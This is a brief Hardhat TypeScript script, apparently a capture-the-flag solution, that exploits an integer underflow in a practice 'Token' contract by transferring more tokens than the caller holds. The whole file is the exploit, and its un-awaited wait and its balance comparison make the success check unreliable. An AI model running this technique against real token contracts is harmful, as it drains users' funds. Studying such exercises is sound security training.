import { ethers } from "hardhat";
import hre from "hardhat";

const CONTRACT_NAME = "Token";
const CONTRACT_ADDRESS = "0x70B429A15467870e2023E615Fe544Ed5286A0c5e";

async function hack() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  //get owner address
  const privateKey = hre.network.config.accounts as string[];
  const wallet = new ethers.Wallet(privateKey[0]).address;
  const _to = ethers.Wallet.createRandom().address;

  const tx = await contract.transfer(_to, 20);
  tx.wait(1);

  const balance = (await contract.balanceOf(wallet)) as number;
  console.log("balance: ", balance.toString());

  if (balance > 20) {
    console.log("Hack");
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
hack().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
